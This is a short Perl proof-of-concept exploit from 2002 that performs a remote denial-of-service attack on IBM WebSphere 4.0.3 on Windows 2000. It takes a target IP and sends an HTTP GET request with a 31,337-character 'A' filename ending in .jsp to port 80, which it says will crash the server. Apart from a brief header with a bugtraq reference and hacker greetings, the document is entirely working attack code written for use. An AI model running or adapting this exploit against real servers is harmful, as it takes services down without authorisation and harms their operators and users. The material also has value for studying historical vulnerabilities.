#!/usr/bin/perl -w
# Proof of concept code
# IBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: Knight420
# Released: 19th Sep 2002 : bugtraq id 5749
#
# Gr33ts:[omega] [lkm] [sorbo]
#
#
use IO::Socket;
if ($#ARGV<0)
{
print "\nIBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: 
Knight420";
print "\n\n Usage: perl sphere.pl ip\n\n";
exit;
}

$a = A;
$dos = $a x 31337;
$fry = ("GET /$dos.jsp HTTP/1.1\n Host: 127.0.0.1\n\n");
$connect = IO::Socket::INET ->new (Proto=>"tcp", PeerAddr=> "$ARGV[0]", 
PeerPort=>"80"); unless ($connect) { die "SERVER IS DOWN $ARGV[0]" }
system('clear ');
printf "IBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: 
knight420";
printf "\n*** [1] Server is up...";
printf "\n*** [2] Sending our elite code...";
print $connect "$fry";
printf "\n*** [3] Server should now be crashed\n\n";
close($connect);


